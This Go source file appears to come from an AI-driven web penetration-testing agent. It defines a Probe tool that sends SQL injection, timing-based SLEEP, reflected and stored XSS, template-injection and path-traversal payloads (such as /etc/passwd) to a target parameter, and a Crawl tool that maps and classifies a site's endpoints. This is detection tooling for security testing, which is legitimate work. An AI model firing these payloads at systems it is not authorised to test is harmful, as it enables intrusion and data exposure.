package agent

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"time"

	"golang.org/x/net/html"

	actool "github.com/Autumn-27/norma/tool"
)

// ---------------------------------------------------------------------------
// Probe — differential vulnerability oracles
//
// The problem this solves: an LLM reading a page can only *guess* that a
// parameter is injectable ("it looks unsanitised"), and guessing is exactly how
// a report fills with unconfirmed findings. Each oracle here replaces the guess
// with a measurement — it sends a baseline, a true-payload and a false-payload
// (or a reflection/timing/canary test) and reports the observed difference. The
// verdict is computed in Go, not by the model.
// ---------------------------------------------------------------------------

const (
	probeDefaultTimeout = 30 * time.Second
	probeTimeThreshold  = 2500 * time.Millisecond
)

type probeTarget struct {
	URL        string
	ReadURL    string // xss_stored: separate GET endpoint that renders the stored value
	Method     string
	Param      string
	BodyFormat string // form | json
	Extra      map[string]string
	Headers    map[string]string
	Timeout    time.Duration
	Insecure   bool
}

// readBackURL returns the endpoint used to observe a stored value. When the
// caller does not supply one, re-read the write URL with the injected parameter
// removed — otherwise a GET-based writer would reflect the payload in the read
// phase and a stored-XSS verdict would be indistinguishable from reflection.
func (p probeTarget) readBackURL() string {
	if strings.TrimSpace(p.ReadURL) != "" {
		return strings.TrimSpace(p.ReadURL)
	}
	u, err := url.Parse(p.URL)
	if err != nil {
		return p.URL
	}
	q := u.Query()
	q.Del(p.Param)
	u.RawQuery = q.Encode()
	return u.String()
}

func (p probeTarget) call(value string) httpCall {
	c := httpCall{
		Method:   p.Method,
		Headers:  p.Headers,
		Timeout:  p.Timeout,
		Insecure: p.Insecure,
	}
	if p.Method == "POST" {
		if strings.EqualFold(p.BodyFormat, "json") {
			c.URL = p.URL
			c.Body = injectJSON(p.Extra, p.Param, value)
			c.ContentType = "application/json"
		} else {
			c.URL = p.URL
			c.Body = injectForm(p.Extra, p.Param, value)
			c.ContentType = "application/x-www-form-urlencoded"
		}
		return c
	}
	u, err := injectQuery(p.URL, p.Param, value)
	if err != nil {
		c.URL = p.URL
	} else {
		c.URL = u
	}
	return c
}

func bodyFingerprint(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:8])
}

func newProbeTool() actool.CoreTool {
	schema := obj(map[string]any{
		"kind": map[string]any{
			"type": "string",
			"enum": []string{"sqli_boolean", "sqli_time", "xss_reflect", "xss_stored", "ssti_eval", "path_traversal"},
			"description": "Oracle to run. sqli_boolean: true/false payload differential. sqli_time: delay-based. " +
				"xss_reflect: does the payload come back unencoded. xss_stored: write a unique marker via url/param, then re-read read_url (or url with the param removed) and require the unchanged marker to be rendered raw. " +
				"ssti_eval: does 7*7 evaluate to 49. path_traversal: does a known file leak.",
		},
		"url":         str("Absolute target URL (without the parameter under test is fine)."),
		"read_url":    str("xss_stored only: endpoint that renders the stored value. Defaults to url with the injected parameter removed."),
		"param":       str("Parameter name to inject."),
		"method":      map[string]any{"type": "string", "enum": []string{"GET", "POST"}, "description": "Default GET."},
		"body_format": map[string]any{"type": "string", "enum": []string{"form", "json"}, "description": "POST body format (default form)."},
		"extra":       map[string]any{"type": "object", "description": "Other parameters to send unchanged.", "additionalProperties": map[string]any{"type": "string"}},
		"headers":     map[string]any{"type": "object", "description": "Extra request headers.", "additionalProperties": map[string]any{"type": "string"}},
		"timeout_ms":  intp("Per-request timeout in ms (default 30000)."),
		"insecure":    map[string]any{"type": "boolean", "description": "Skip TLS verification."},
	}, "kind", "url", "param")

	desc := "Run a differential vulnerability oracle against one parameter and return a computed verdict (CONFIRMED / NOT CONFIRMED) with the measurements behind it. Use it instead of guessing whether a parameter is injectable: it sends a baseline plus a true and a false payload (or a reflection/timing/canary test) and compares responses in code. When the verdict is CONFIRMED, cite its measured numbers as the finding proof."
	return writeTool("Probe", desc, schema, runProbe)
}

func runProbe(ctx context.Context, in json.RawMessage) (actool.Result, error) {
	var a struct {
		Kind       string            `json:"kind"`
		URL        string            `json:"url"`
		ReadURL    string            `json:"read_url"`
		Param      string            `json:"param"`
		Method     string            `json:"method"`
		BodyFormat string            `json:"body_format"`
		Extra      map[string]string `json:"extra"`
		Headers    map[string]string `json:"headers"`
		TimeoutMS  int               `json:"timeout_ms"`
		Insecure   bool              `json:"insecure"`
	}
	if err := json.Unmarshal(in, &a); err != nil {
		return actool.Errorf("Probe: " + err.Error()), nil
	}
	if strings.TrimSpace(a.Param) == "" || strings.TrimSpace(a.URL) == "" {
		return actool.Errorf("Probe: url and param are required"), nil
	}
	method := strings.ToUpper(strings.TrimSpace(a.Method))
	if method == "" {
		method = "GET"
	}
	if method == "POST" && a.BodyFormat == "" {
		a.BodyFormat = "form"
	}
	timeout := probeDefaultTimeout
	if a.TimeoutMS > 0 {
		timeout = time.Duration(a.TimeoutMS) * time.Millisecond
	}
	t := probeTarget{
		URL: a.URL, ReadURL: a.ReadURL, Method: method, Param: a.Param, BodyFormat: a.BodyFormat,
		Extra: a.Extra, Headers: a.Headers, Timeout: timeout, Insecure: a.Insecure,
	}

	switch a.Kind {
	case "sqli_boolean":
		return oracleSQLiBoolean(ctx, t)
	case "sqli_time":
		return oracleSQLiTime(ctx, t)
	case "xss_reflect":
		return oracleXSSReflect(ctx, t)
	case "xss_stored":
		return oracleXSSStored(ctx, t)
	case "ssti_eval":
		return oracleSSTI(ctx, t)
	case "path_traversal":
		return oracleTraversal(ctx, t)
	default:
		return actool.Errorf(fmt.Sprintf("Probe: unknown kind %q", a.Kind)), nil
	}
}

type observation struct {
	Status  int
	Len     int
	FP      string
	Elapsed time.Duration
	Snippet string
	Body    []byte
}

func observe(res *httpResult, err error) observation {
	if err != nil {
		return observation{Status: 0, Snippet: err.Error()}
	}
	snippet := string(res.Body)
	if len(snippet) > 160 {
		snippet = snippet[:160]
	}
	return observation{
		Status:  res.Status,
		Len:     len(res.Body),
		FP:      bodyFingerprint(res.Body),
		Elapsed: res.Elapsed,
		Snippet: strings.ReplaceAll(snippet, "\n", " "),
		Body:    res.Body,
	}
}

func runOne(ctx context.Context, t probeTarget, value string) observation {
	res, err := doHTTP(ctx, t.call(value))
	return observe(res, err)
}

// probeSQLiRepeats is the number of measurements the SQLi oracles take.
// Repeats + normalization + false-positive suppression is Phase 2's
// "repeated baseline and control measurements, response normalization,
// differential analysis, false-positive detection".
const probeSQLiRepeats = 3

func observeRepeat(ctx context.Context, t probeTarget, value string, n int) []observation {
	out := make([]observation, 0, n)
	for i := 0; i < n; i++ {
		out = append(out, runOne(ctx, t, value))
	}
	return out
}

func normBody(s string) string {
	s = strings.TrimSpace(s)
	s = strings.Join(strings.Fields(s), " ")
	return s
}

// normSet returns the set of distinct normalized response bodies in observations.
func normSet(os []observation) map[string]bool {
	out := map[string]bool{}
	for _, o := range os {
		if o.Status == 0 {
			continue
		}
		out[normBody(string(o.Body))] = true
	}
	return out
}

func oracleSQLiBoolean(ctx context.Context, t probeTarget) (actool.Result, error) {
	base := observeRepeat(ctx, t, "1", probeSQLiRepeats)
	tr := observeRepeat(ctx, t, "' OR '1'='1", probeSQLiRepeats)
	fa := observeRepeat(ctx, t, "' AND '1'='2", probeSQLiRepeats)

	baseSet := normSet(base)
	trueSet := normSet(tr)
	falseSet := normSet(fa)

	baseObs, trObs, faObs := last(base), last(tr), last(fa)

	// FP suppression: if true runs look like baseline runs (and are also the
	// only shape — the endpoint ignores the parameter), we say NOT CONFIRMED.
	// If the true body is NOT what false bodies return, the parameter changes
	// SQL logic — signal.
	confirmed := false
	for tb := range trueSet {
		if _, inFalse := falseSet[tb]; !inFalse {
			if _, inBase := baseSet[tb]; !inBase {
				confirmed = true
			}
		}
	}

	var b strings.Builder
	fmt.Fprintf(&b, "oracle=sqli_boolean param=%s repeats=%d\n", t.Param, probeSQLiRepeats)
	fmt.Fprintf(&b, "baseline(1):          status=%d len=%d fp=%s\n", baseObs.Status, baseObs.Len, baseObs.FP)
	fmt.Fprintf(&b, "true(' OR '1'='1):    status=%d len=%d fp=%s\n", trObs.Status, trObs.Len, trObs.FP)
	fmt.Fprintf(&b, "false(' AND '1'='2):  status=%d len=%d fp=%s\n", faObs.Status, faObs.Len, faObs.FP)
	fmt.Fprintf(&b, "distinct_responses: baseline=%d true=%d false=%d\n", len(baseSet), len(trueSet), len(falseSet))
	if trObs.Status == 0 {
		fmt.Fprintf(&b, "note: true-payload request failed: %s\n", trObs.Snippet)
	}
	if confirmed {
		fmt.Fprintf(&b, "VERDICT: CONFIRMED — some true response differs from every false and baseline response (SQL logic changes with this input).\n")
		fmt.Fprintf(&b, "evidence: %s param=%s baseline=%d bytes / true=%d bytes / false=%d bytes, distinct true=%d distinct false=%d\n",
			t.Method, t.Param, baseObs.Len, trObs.Len, faObs.Len, len(trueSet), len(falseSet))
	} else {
		fmt.Fprintf(&b, "VERDICT: NOT CONFIRMED — no true response separated from false/baseline.\n")
	}
	return actool.Text(b.String()), nil
}

func last(os []observation) observation {
	if len(os) == 0 {
		return observation{}
	}
	return os[len(os)-1]
}

func oracleSQLiTime(ctx context.Context, t probeTarget) (actool.Result, error) {
	base := runOne(ctx, t, "1")
	const reps = 3
	payloadObs := make([]observation, 0, reps)
	for i := 0; i < reps; i++ {
		payloadObs = append(payloadObs, runOne(ctx, t, "' OR SLEEP(3)-- -"))
	}

	var maxElapsed time.Duration
	for _, o := range payloadObs {
		if o.Elapsed > maxElapsed {
			maxElapsed = o.Elapsed
		}
	}
	confirmed := base.Status > 0 && len(payloadObs) > 0 && payloadObs[0].Status > 0 && maxElapsed >= probeTimeThreshold
	delay := maxElapsed - base.Elapsed

	var b strings.Builder
	fmt.Fprintf(&b, "oracle=sqli_time param=%s baseline_status=%d\n", t.Param, base.Status)
	fmt.Fprintf(&b, "baseline(1):     status=%d elapsed=%s\n", base.Status, base.Elapsed.Round(time.Millisecond))
	for i, o := range payloadObs {
		fmt.Fprintf(&b, "SLEEP(3) payload#%d: status=%d elapsed=%s\n", i+1, o.Status, o.Elapsed.Round(time.Millisecond))
	}
	fmt.Fprintf(&b, "max_payload_elapsed=%s threshold=%s delay=%s\n", maxElapsed.Round(time.Millisecond), probeTimeThreshold, delay.Round(time.Millisecond))
	if confirmed {
		fmt.Fprintf(&b, "VERDICT: CONFIRMED — a payload run added %s over baseline, consistent with injected SLEEP.\n", delay.Round(time.Millisecond))
		fmt.Fprintf(&b, "evidence: %s %s param=%s baseline=%s payload=%s\n", t.Method, t.URL, t.Param, base.Elapsed.Round(time.Millisecond), maxElapsed.Round(time.Millisecond))
	} else {
		fmt.Fprintf(&b, "VERDICT: NOT CONFIRMED — no delay beyond threshold.\n")
	}
	return actool.Text(b.String()), nil
}

func oracleXSSReflect(ctx context.Context, t probeTarget) (actool.Result, error) {
	marker := "artex" + fmt.Sprintf("%d", time.Now().UnixNano()%1000000)
	payload := `"><svg/onload=` + marker + `>`
	res, err := doHTTP(ctx, t.call(payload))
	if err != nil {
		return actool.Errorf("Probe xss_reflect: " + err.Error()), nil
	}
	body := string(res.Body)
	rawHit := strings.Contains(body, payload)
	partialHit := strings.Contains(body, marker)
	encoded := !rawHit && strings.Contains(body, htmlEscape(payload))

	var b strings.Builder
	fmt.Fprintf(&b, "oracle=xss_reflect param=%s status=%d len=%d\n", t.Param, res.Status, len(res.Body))
	fmt.Fprintf(&b, "payload=%s\n", payload)
	fmt.Fprintf(&b, "raw_reflected=%t marker_present=%t html_encoded=%t\n", rawHit, partialHit, encoded)
	if rawHit {
		fmt.Fprintf(&b, "VERDICT: CONFIRMED — the payload returned unencoded, so it executes in an HTML context.\n")
		fmt.Fprintf(&b, "evidence: %s %s param=%s reflected payload=%s (status %d)\n", t.Method, t.URL, t.Param, payload, res.Status)
	} else if partialHit {
		fmt.Fprintf(&b, "VERDICT: NOT CONFIRMED — marker present but the JavaScript-bearing part was altered/filtered. Inspect the context before reporting.\n")
	} else {
		fmt.Fprintf(&b, "VERDICT: NOT CONFIRMED — payload not reflected.\n")
	}
	return actool.Text(b.String()), nil
}

// oracleXSSStored verifies STORED (persistent) XSS, not reflection. It writes a
// unique marker through the target parameter, then fetches an independent read
// endpoint (with the injected parameter removed) and requires the *unchanged*
// script-bearing payload to come back in a fresh response. The read phase uses
// the shared cookie jar, so a login or session established during probing is
// retained, but no payload is ever sent on the read request. A raw marker that
// only appears in the write response is NOT stored XSS and is rejected.
func oracleXSSStored(ctx context.Context, t probeTarget) (actool.Result, error) {
	marker := "artexstored" + fmt.Sprintf("%d", time.Now().UnixNano()%1000000)
	payload := `"><svg/onload=` + marker + `>`
	readURL := t.readBackURL()

	write, werr := doHTTP(ctx, t.call(payload))
	read, rerr := doHTTP(ctx, httpCall{Method: "GET", URL: readURL, Timeout: t.Timeout, Insecure: t.Insecure})

	var b strings.Builder
	fmt.Fprintf(&b, "oracle=xss_stored param=%s write_method=%s write_url=%s read_url=%s\n", t.Param, t.Method, t.URL, readURL)
	fmt.Fprintf(&b, "payload=%s\n", payload)
	if werr != nil {
		fmt.Fprintf(&b, "write_status=0 note: write request failed: %s\n", werr)
	} else {
		fmt.Fprintf(&b, "write_status=%d write_len=%d\n", write.Status, len(write.Body))
	}
	if rerr != nil {
		fmt.Fprintf(&b, "read_status=0 note: read-back request failed: %s\n", rerr)
	} else {
		fmt.Fprintf(&b, "read_status=%d read_len=%d\n", read.Status, len(read.Body))
	}

	// A verdict requires BOTH a successful write and a successful, independent
	// read. Never confirm from the write response alone.
	if werr != nil || rerr != nil || write == nil || read == nil {
		fmt.Fprintf(&b, "VERDICT: NOT CONFIRMED — write or read-back request failed; no stored-XSS proof.\n")
		return actool.Text(b.String()), nil
	}
	body := string(read.Body)
	rawHit := strings.Contains(body, payload)
	markerHit := strings.Contains(body, marker)
	encoded := !rawHit && strings.Contains(body, htmlEscape(payload))

	fmt.Fprintf(&b, "read_raw_payload=%t read_marker_present=%t read_html_encoded=%t\n", rawHit, markerHit, encoded)
	switch {
	case rawHit:
		fmt.Fprintf(&b, "VERDICT: CONFIRMED — the unique script payload was persisted and rendered unencoded by a separate GET (no payload on that request).\n")
		fmt.Fprintf(&b, "evidence: %s %s param=%s payload=%s -> GET %s returned the unchanged payload (status %d)\n", t.Method, t.URL, t.Param, payload, readURL, read.Status)
	case markerHit:
		fmt.Fprintf(&b, "VERDICT: NOT CONFIRMED — the marker persisted but the script-bearing payload was altered/filtered; inspect the stored context before reporting.\n")
	case encoded:
		fmt.Fprintf(&b, "VERDICT: NOT CONFIRMED — the marker is HTML-encoded on read-back; no executable stored context.\n")
	default:
		fmt.Fprintf(&b, "VERDICT: NOT CONFIRMED — payload was not present in the read-back response; not stored.\n")
	}
	return actool.Text(b.String()), nil
}

func oracleSSTI(ctx context.Context, t probeTarget) (actool.Result, error) {
	base := runOne(ctx, t, "artex")
	results := map[string]observation{}
	for _, p := range []string{"${7*7}", "{{7*7}}", "<%= 7*7 %>"} {
		results[p] = runOne(ctx, t, p)
	}

	confirmedBy := ""
	for p, o := range results {
		if o.Status > 0 && !strings.Contains(o.Snippet, p) && containsToken(o, "49") && !containsToken(base, "49") {
			confirmedBy = p
			break
		}
	}

	var b strings.Builder
	fmt.Fprintf(&b, "oracle=ssti_eval param=%s\n", t.Param)
	fmt.Fprintf(&b, "baseline(artex): status=%d len=%d has49=%t\n", base.Status, base.Len, containsToken(base, "49"))
	for _, p := range []string{"${7*7}", "{{7*7}}", "<%= 7*7 %>"} {
		o := results[p]
		fmt.Fprintf(&b, "payload %-12s status=%d len=%d has49=%t\n", p, o.Status, o.Len, containsToken(o, "49"))
	}
	if confirmedBy != "" {
		fmt.Fprintf(&b, "VERDICT: CONFIRMED — %s evaluated to 49 on the server.\n", confirmedBy)
		fmt.Fprintf(&b, "evidence: %s %s param=%s payload=%s -> response contains 49\n", t.Method, t.URL, t.Param, confirmedBy)
	} else {
		fmt.Fprintf(&b, "VERDICT: NOT CONFIRMED — no payload evaluated.\n")
	}
	return actool.Text(b.String()), nil
}

func oracleTraversal(ctx context.Context, t probeTarget) (actool.Result, error) {
	payloads := []string{
		"../../../../../../etc/passwd",
		"..\\..\\..\\..\\..\\..\\windows\\win.ini",
	}
	var b strings.Builder
	fmt.Fprintf(&b, "oracle=path_traversal param=%s\n", t.Param)
	confirmed := false
	for _, p := range payloads {
		o := runOne(ctx, t, p)
		full := string(o.Body)
		hit := ""
		if strings.Contains(full, "root:x:0:0") {
			hit = "unix_passwd"
		} else if strings.Contains(full, "[fonts]") || strings.Contains(full, "[extensions]") {
			hit = "windows_ini"
		}
		if hit != "" {
			confirmed = true
		}
		fmt.Fprintf(&b, "payload=%-40s status=%d len=%d signature=%s\n", p, o.Status, o.Len, orNone(hit))
		if hit != "" {
			fmt.Fprintf(&b, "evidence: %s %s param=%s payload=%s leaked %s\n", t.Method, t.URL, t.Param, p, hit)
		}
	}
	if confirmed {
		fmt.Fprintf(&b, "VERDICT: CONFIRMED — a file-system signature was returned.\n")
	} else {
		fmt.Fprintf(&b, "VERDICT: NOT CONFIRMED — no file signature observed.\n")
	}
	return actool.Text(b.String()), nil
}

func containsToken(o observation, tok string) bool { return strings.Contains(string(o.Body), tok) }

func orNone(s string) string {
	if s == "" {
		return "-"
	}
	return s
}

func htmlEscape(s string) string {
	r := strings.NewReplacer("&", "&amp;", "<", "&lt;", ">", "&gt;", `"`, "&quot;", "'", "&#39;")
	return r.Replace(s)
}

// ---------------------------------------------------------------------------
// Crawl — bounded same-host endpoint discovery
//
// Before this, the agent guessed routes ("/portal/api/content", "/api/report")
// and collected 404s; most of the real surface lives in links, forms and inline
// JS paths. The crawler walks the same host only, bounded by depth and page
// count, and reports the discovered endpoints instead of fetching them blindly.
// ---------------------------------------------------------------------------

type crawlPage struct {
	URL    string `json:"url"`
	Status int    `json:"status"`
	Title  string `json:"title,omitempty"`
}

type crawlForm struct {
	Action string   `json:"action"`
	Method string   `json:"method"`
	Inputs []string `json:"inputs"`
}

func newCrawlTool() actool.CoreTool {
	schema := obj(map[string]any{
		"url":        str("Absolute start URL."),
		"max_pages":  intp("Maximum pages to fetch (default 20, max 60)."),
		"depth":      intp("Link depth to follow from the start page (default 2, max 3)."),
		"timeout_ms": intp("Per-request timeout in ms (default 15000)."),
		"insecure":   map[string]any{"type": "boolean", "description": "Skip TLS verification."},
	}, "url")

	desc := "Crawl a site from a start URL and return discovered endpoints: pages (with status+title), links, forms (action/method/inputs), JS API paths, per-endpoint parameter names (params), a classification (auth/admin/api/static/search/public), and a confidence score. Same host only, bounded by max_pages/depth, with a small delay between requests. Use the output to choose real endpoints and auth entry points instead of guessing."
	return writeTool("Crawl", desc, schema, runCrawl)
}

func runCrawl(ctx context.Context, in json.RawMessage) (actool.Result, error) {
	var a struct {
		URL       string `json:"url"`
		MaxPages  int    `json:"max_pages"`
		Depth     int    `json:"depth"`
		TimeoutMS int    `json:"timeout_ms"`
		Insecure  bool   `json:"insecure"`
	}
	if err := json.Unmarshal(in, &a); err != nil {
		return actool.Errorf("Crawl: " + err.Error()), nil
	}
	start, err := url.Parse(strings.TrimSpace(a.URL))
	if err != nil || start.Scheme == "" || start.Host == "" {
		return actool.Errorf(fmt.Sprintf("Crawl: invalid url %q", a.URL)), nil
	}
	maxPages := a.MaxPages
	if maxPages <= 0 {
		maxPages = 20
	}
	if maxPages > 60 {
		maxPages = 60
	}
	depth := a.Depth
	if depth <= 0 {
		depth = 2
	}
	if depth > 3 {
		depth = 3
	}
	timeout := 15 * time.Second
	if a.TimeoutMS > 0 {
		timeout = time.Duration(a.TimeoutMS) * time.Millisecond
	}

	type item struct {
		u     string
		depth int
	}
	queue := []item{{start.String(), 0}}
	seen := map[string]bool{}
	host := strings.ToLower(start.Host)

	var pages []crawlPage
	links := map[string]bool{}
	jsPaths := map[string]bool{}
	formsSeen := map[string]crawlForm{}

	for len(queue) > 0 && len(pages) < maxPages {
		cur := queue[0]
		queue = queue[1:]
		if seen[cur.u] {
			continue
		}
		seen[cur.u] = true

		res, err := doHTTP(ctx, httpCall{Method: "GET", URL: cur.u, Timeout: timeout, Insecure: a.Insecure})
		if err != nil {
			pages = append(pages, crawlPage{URL: cur.u, Status: 0})
			continue
		}
		pages = append(pages, crawlPage{URL: cur.u, Status: res.Status})
		if res.Status < 200 || res.Status >= 400 {
			continue
		}

		doc, perr := html.Parse(strings.NewReader(string(res.Body)))
		if perr != nil {
			continue
		}

		base, _ := url.Parse(cur.u)
		var title string
		var walk func(*html.Node)
		walk = func(n *html.Node) {
			if n.Type == html.ElementNode {
				switch n.Data {
				case "title":
					if n.FirstChild != nil {
						title = strings.TrimSpace(n.FirstChild.Data)
					}
				case "a":
					if href := attr(n, "href"); href != "" {
						if abs := resolveURL(base, href); abs != "" {
							if strings.ToLower(mustHost(abs)) == host {
								links[abs] = true
								if cur.depth < depth {
									queue = append(queue, item{abs, cur.depth + 1})
								}
							}
						}
					}
					for c := n.FirstChild; c != nil; c = c.NextSibling {
						walk(c)
					}
					return
				case "form":
					f := crawlForm{Action: resolveURL(base, attr(n, "action")), Method: strings.ToUpper(attr(n, "method"))}
					if f.Method == "" {
						f.Method = "GET"
					}
					if f.Action == "" {
						f.Action = cur.u
					}
					f.Inputs = collectInputs(n)
					formsSeen[f.Method+" "+f.Action+" "+strings.Join(f.Inputs, ",")] = f
				case "script":
					if n.FirstChild != nil {
						for _, p := range jsPathRe.FindAllStringSubmatch(n.FirstChild.Data, -1) {
							jsPaths[p[1]] = true
						}
					}
				}
			}
			for c := n.FirstChild; c != nil; c = c.NextSibling {
				walk(c)
			}
		}
		walk(doc)
		if title != "" && len(pages) > 0 {
			pages[len(pages)-1].Title = title
		}
		time.Sleep(80 * time.Millisecond)
	}

	linkList := mapKeys(links)
	jsList := mapKeys(jsPaths)
	formList := make([]crawlForm, 0, len(formsSeen))
	for _, f := range formsSeen {
		formList = append(formList, f)
	}
	sort.Slice(formList, func(i, j int) bool { return formList[i].Action < formList[j].Action })

	// Phase 3 — attack-surface intelligence.
	params := collectParams(pages, formList)
	classification := map[string]string{}
	confidence := map[string]int{}
	for _, p := range pages {
		classification[p.URL] = classifyPath(p.URL)
		confidence[p.URL] = scorePath(p.URL, p.Status)
	}

	out := map[string]any{
		"start":         start.String(),
		"host":          start.Host,
		"fetched":       len(pages),
		"pages":         pages,
		"links":         linkList,
		"forms":         formList,
		"js_paths":      jsList,
		"params":        params,
		"classification": classification,
		"confidence":     confidence,
	}
	raw, _ := json.MarshalIndent(out, "", "  ")
	return actool.Text(string(raw)), nil
}

func collectParams(pages []crawlPage, forms []crawlForm) map[string][]string {
	out := map[string][]string{}
	add := func(url string, names []string) {
		if len(names) == 0 {
			return
		}
		u, err := urlParse(url)
		if err != nil {
			out[url] = append(out[url], names...)
			return
		}
		if existing := out[u.String()]; len(existing) > 0 {
			out[u.String()] = append(existing, names...)
		} else {
			out[u.String()] = append(out[u.String()], names...)
		}
	}
	for _, p := range pages {
		u, err := urlParse(p.URL)
		if err != nil {
			continue
		}
		var names []string
		for n := range u.Query() {
			names = append(names, n)
		}
		sort.Strings(names)
		add(p.URL, names)
	}
	for _, f := range forms {
		add(f.Action, f.Inputs)
	}
	for k := range out {
		out[k] = dedupStr(out[k])
	}
	return out
}

func dedupStr(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range in {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	return out
}

func urlParse(s string) (*url.URL, error) {
	return url.Parse(s)
}

// classifyPath assigns an endpoint class. Used by Phase 3 consumers and by
// the Crawl output so the agent can prioritize.
func classifyPath(p string) string {
	low := strings.ToLower(p)
	switch {
	case strings.Contains(low, "/login") || strings.Contains(low, "/signin") || strings.Contains(low, "/auth") || strings.Contains(low, "/session"):
		return "auth"
	case strings.Contains(low, "/admin") || strings.HasPrefix(low, "/admin/"):
		return "admin"
	case strings.Contains(low, "/api/") || strings.Contains(low, "/rest/"):
		return "api"
	case strings.Contains(low, "/static") || strings.Contains(low, "/assets") || strings.Contains(low, "/uploads") ||
		strings.Contains(low, ".js") || strings.Contains(low, ".css") || strings.Contains(low, ".png") ||
		strings.Contains(low, ".jpg") || strings.Contains(low, ".svg"):
		return "static"
	case strings.Contains(low, "search") || strings.Contains(low, "query") || strings.Contains(low, "/find"):
		return "search"
	case p == "" || p == "/":
		return "public"
	default:
		return "public"
	}
}

func scorePath(rawURL string, status int) int {
	score := 50
	if status >= 200 && status < 400 {
		score = 70
	}
	if status == 200 {
		score += 10
	}
	if strings.Contains(strings.ToLower(rawURL), "/login") || strings.Contains(strings.ToLower(rawURL), "/api/") {
		score += 10
	}
	return score
}

var jsPathRe = regexp.MustCompile(`["'](/[A-Za-z0-9_\-./]{2,120})["']`)

func attr(n *html.Node, key string) string {
	for _, a := range n.Attr {
		if strings.EqualFold(a.Key, key) {
			return a.Val
		}
	}
	return ""
}

func collectInputs(form *html.Node) []string {
	var out []string
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode && (n.Data == "input" || n.Data == "textarea" || n.Data == "select") {
			if name := attr(n, "name"); name != "" {
				out = append(out, name)
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(form)
	sort.Strings(out)
	return out
}

func resolveURL(base *url.URL, href string) string {
	href = strings.TrimSpace(href)
	if href == "" || strings.HasPrefix(href, "#") || strings.HasPrefix(href, "javascript:") || strings.HasPrefix(href, "mailto:") {
		return ""
	}
	u, err := base.Parse(href)
	if err != nil || (u.Scheme != "http" && u.Scheme != "https") {
		return ""
	}
	u.Fragment = ""
	return u.String()
}

func mustHost(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return ""
	}
	return u.Host
}

func mapKeys(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}
